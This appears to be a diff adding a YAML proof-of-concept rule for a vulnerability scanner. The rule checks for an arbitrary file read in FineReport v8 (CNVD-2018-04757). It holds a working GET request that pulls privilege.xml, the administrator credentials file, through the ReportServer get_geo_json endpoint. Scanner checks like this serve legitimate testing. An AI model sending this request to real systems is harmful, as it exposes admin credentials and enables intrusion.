@@ -1,0 +1,11 @@
+name: poc-yaml-finereport-v8-arbitrary-file-read
+rules:
+  - method: GET
+    path: /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"rootManagerName") && response.body.bcontains(b"CDATA")
+detail:
+  author: Facker007(https://github.com/Facker007)
+  links:
+    - http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757.html?h=%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8
